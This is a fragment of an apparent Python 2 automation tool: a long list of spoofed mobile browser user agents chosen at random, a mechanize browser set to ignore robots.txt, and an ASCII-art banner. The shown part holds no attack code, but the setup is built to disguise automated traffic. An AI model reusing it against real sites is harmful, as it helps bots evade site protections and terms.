NokiaC2-06/07.29; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia5130c-2/07.97; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia112/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia203/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia308/07.55; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia114/03.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia301.1/08.02; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia2051/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia515.2/05.08; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia203/20.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia311/07.36; Profile/MIDP-1.2 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia306/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.48", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia210/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia2730c-1/10.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia112/03.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia203/20.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; NokiaC1-01/06.15; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia112/03.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia301/09.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208.1/04.06; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia2730c-1/10.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia306/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia308/08.13; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia208/ddECL3G_13w22; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; NokiaC2-03/07.29; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia112/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia114/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/11.57; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia112/03.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia502/14.0.4/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.20", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.1.0.0.62", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX3-02/le6.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.0.11.8", "Mozilla/5.0 (Series40; Nokia112/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia302/14.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/11.79; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia203/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/11.79; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia502/14.0.5/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.20", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-01/08.70; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia311/03.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia306/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia301/02.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.9", "Mozilla/5.0 (Series40; NokiaC2-03/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/32.0.3 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia302/14.53; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia203/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia308/05.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia515.2/05.08; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia210.2/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-00/04.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaAsha230DualSIM/14.0.5/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.20", "Mozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia203/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208.4/06.01; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia515.2/10.34; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia6300/07.30; Profile/MIDP-2.0 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; NokiaC1-01/06.15; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia205/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia6300/07.30; Profile/MIDP-2.0 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia208/09.05; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; NokiaX2-02/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia208/10.34; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-03/23.0.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia301.1/08.02; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.48", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia305/07.35; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/091.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.34 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia207.1/10.24; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia2052/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia307/07.55; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; NokiaX3-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Linux; Android 4.1.2; GT-P3110; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208.4/04.06; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45. browser: Nokia Browser OS40", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC3-01/07.53; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (series40; NokiaX2-02/10.90;Profile/MIDP-2.1 configuration/CLD-1.1) gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Symbian/3; Android 2.3.5; Nokia808PureView/113.010.1508; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.2.21 Mobile Safari/535.1", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Mozilla/5.0 (Series30Plus; Nokia225/20.10.11; Profile/Series30Plus Configuration/Series30Plus) Gecko/20100401 S40OviBrowser/3.8.1.2.06", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia305/07.35; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia515/07.01; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia208/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series30Plus; Nokia225/20.10.11; Profile/Series30Plus Configuration/Series30Plus) Gecko/20100401 S40OviBrowser/3.8.1.2.0612", "Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.48", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia2700-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45"])

ua = randomua

reload(sys)
sys.setdefaultencoding("utf-8")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent',ua)]

banner = """\033[1;91m•\033[1;37m
█   ▒█████   ███▄    █  ▄████  ▄▄▄▄    ▄▄▄      ▄▄▄     ▒███████▒    ▄▄▄█████▓ ███▄ ▄███▓
▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █  ██▒ ▀█▓█████▄ ▒████▄   ▒████▄   ▒ ▒ ▒ ▄▀░    ▓  ██▒ ▓▒▓██▒▀█▀ ██▒
▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██░▄▄▄▒██▒ ▄██▒██  ▀█▄ ▒██  ▀█▄ ░ ▒ ▄▀▒░     ▒ ▓██░ ▒░▓██    ▓██░
▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░▓█  ██▒██░█▀  ░██▄▄▄▄██░██▄▄▄▄██  ▄▀▒   ░    ░ ▓██▓ ░ ▒██    ▒██ 
░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░▒▓███▀▒░▓█  ▀█▓▒▓█   ▓██▒▓█   ▓██▒███████▒      ▒██▒ ░ ▒██▒   ░██▒
░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▒   ▒ ░▒▓███▀▒░▒▒   ▓▒█░▒▒   ▓▒█░▒▒ ▓░▒░▒      ▒ ░░   ░ ▒░   ░  ░
  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░   ░ ▒░▒   ░ ░ ░   ▒▒ ░ ░   ▒▒  ░▒ ▒ ░ ▒        ░    ░  ░      ░
